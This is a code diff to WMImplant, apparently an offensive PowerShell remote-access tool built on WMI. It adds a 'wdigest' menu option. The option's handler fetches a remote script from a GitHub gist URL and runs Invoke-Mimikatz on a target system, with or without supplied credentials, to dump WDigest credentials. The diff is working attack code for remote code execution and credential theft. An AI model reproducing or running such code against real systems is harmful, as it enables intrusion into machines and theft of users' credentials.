@@ -2700,7 +2700,8 @@ function Show-WMImplantMainMenu
     $menu_options += "registry_mod - Modify the registry on the targeted system`n"
     $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
     $menu_options += "sched_job - Manipulate scheduled jobs`n"
-    $menu_options += "service_mod - Create, delete, or modify services`n`n"
+    $menu_options += "service_mod - Create, delete, or modify services`n"
+    $menu_options += "wdigest - Alias for wdigest function of Mimikatz`n`n"
 
     $menu_options += "Process Operations`n"
     $menu_options += "====================================================================`n"
@@ -2890,6 +2891,18 @@ function Use-MenuSelection
                 else
                 {
                     Invoke-ServiceMod
+                }
+            }
+
+            "wdigest"
+            {
+                if($Credential)
+                {
+                    Invoke-RemoteScriptWithOutput -Creds $Credential -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz
+                }
+                else
+                {
+                    Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz
                 }
             }
 
